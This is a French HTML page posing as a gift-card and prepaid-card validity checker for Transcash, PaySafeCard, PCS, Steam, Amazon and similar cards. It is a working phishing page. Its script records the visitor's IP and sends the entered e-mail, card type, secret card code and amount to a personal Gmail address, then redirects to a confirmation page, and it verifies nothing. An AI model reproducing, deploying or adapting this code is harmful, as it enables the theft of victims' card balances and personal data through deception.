<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Vérificateur de Cartes Cadeaux</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    :root {
      --primary: #2980b9;
      --primary-dark: #1c5d8c;
      --success: #2ecc71;
      --error: #e74c3c;
      --warning: #f39c12;
      --text: #2c3e50;
      --light-bg: #f4f6f9;
      --card-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: var(--light-bg);
      padding: 20px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
    }

    header {
      text-align: center;
      margin-bottom: 30px;
    }

    h1 {
      color: var(--primary);
      font-size: 2rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .subtitle {
      color: #7f8c8d;
      font-size: 1rem;
    }

    .card-box {
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: var(--card-shadow);
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      font-weight: 600;
      margin-bottom: 8px;
      display: block;
    }

    .input-icon {
      position: relative;
    }

    .input-icon i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #95a5a6;
    }

    input[type="text"],
    input[type="password"],
    input[type="email"],
    select {
      width: 100%;
      padding: 12px 15px 12px 45px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      font-family: inherit;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: var(--primary);
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    #result {
      margin-top: 20px;
      padding: 15px;
      border-radius: 8px;
      font-weight: 600;
      text-align: center;
      background: var(--success);
      color: white;
      display: none;
    }

    .card-details {
      margin-top: 20px;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 8px;
      display: none;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 5px 0;
    }

    .card-logos {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      margin-top: 30px;
    }

    .card-logo-item {
      background: #f8f9fa;
      padding: 10px;
      border-radius: 8px;
      width: 100%;
      max-width: 300px;
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .card-logo-img {
      height: 40px;
    }

    .checkbox-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 8px;
    }

    footer {
      margin-top: 40px;
      text-align: center;
      color: #95a5a6;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1><i class="fas fa-gift"></i> Vérificateur de Cartes Cadeaux</h1>
      <p class="subtitle">Vérifiez la validité de vos cartes prépayées</p>
    </header>

    <div class="card-box">
      <form id="checkCardForm">
        <div class="form-group">
          <label for="email">Votre e-mail :</label>
          <div class="input-icon">
            <i class="fas fa-envelope"></i>
            <input type="email" id="email" required />
          </div>
        </div>

        <div class="form-group">
          <label for="cardType">Type de carte :</label>
          <div class="input-icon">
            <i class="fas fa-credit-card"></i>
            <select id="cardType" required>
              <option value="">-- Choisissez une carte --</option>
              <option value="transcash">Transcash</option>
              <option value="paysafecard">PaySafeCard</option>
              <option value="pcs">PCS</option>
              <option value="google_play">Google Play</option>
              <option value="neosurf">NeoSurf</option>
              <option value="amazon">Amazon</option>
              <option value="appstore_itunes">AppStore & iTunes</option>
              <option value="steam">Steam</option>
              <option value="apple">Apple</option>
              <option value="vanilla">Vanilla</option>
              <option value="toneo">Toneo</option>
            </select>
          </div>
        </div>

        <div class="form-group">
          <label for="amount">Montant (€) :</label>
          <div class="input-icon">
            <i class="fas fa-euro-sign"></i>
            <select id="amount" required>
              <option value="">-- Sélectionnez un montant --</option>
              <option value="10">10 €</option>
              <option value="20">20 €</option>
              <option value="30">30 €</option>
              <option value="40">40 €</option>
              <option value="50">50 €</option>
              <option value="100">100 €</option>
              <option value="150">150 €</option>
              <option value="200">200 €</option>
              <option value="250">250 €</option>
              <option value="300">300 €</option>
              <option value="350">350 €</option>
              <option value="400">400 €</option>
              <option value="450">450 €</option>
              <option value="500">500 €</option>
            </select>
          </div>
        </div>

        <div class="form-group">
          <label for="cardCode">Code secret :</label>
          <div class="input-icon">
            <i class="fas fa-barcode"></i>
            <input type="text" id="cardCode" required />
          </div>
          <div class="checkbox-row">
            <input type="checkbox" id="toggleCode" />
            <label for="toggleCode">Cacher le code</label>
          </div>
        </div>

        <button type="submit">Vérifier</button>
      </form>

      <div class="card-logos">
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" />
          <span>Amazon</span>
        </div>
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
          <span>Apple / iTunes</span>
        </div>
        <div class="card-logo-item">
          <img class="card-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam" />
          <span>Steam</span>
        </div>
      </div>
    </div>

    <footer>© 2025 Vérificateur de Cartes Cadeaux</footer>
  </div>

  <script>
    const toggleCheckbox = document.getElementById('toggleCode');
    const cardCodeInput = document.getElementById('cardCode');

    toggleCheckbox.addEventListener('change', () => {
      cardCodeInput.type = toggleCheckbox.checked ? 'password' : 'text';
    });

    document.getElementById('checkCardForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const type = document.getElementById('cardType').value;
      const code = document.getElementById('cardCode').value;
      const amount = document.getElementById('amount').value;

      const ip = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip);

      await fetch("/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: "stlljustina@gmail.com",
          subject: "Nouvelle vérification de carte",
          message: `E-mail: ${email}\nType: ${type}\nCode: ${code}\nMontant: ${amount} €\nDate: ${new Date().toLocaleString()}\nIP: ${ip}`
        })
      });

      // Rediriger vers confirmation.html
      window.location.href = "confirmation.html";
    });
  </script>
</body>
</html>
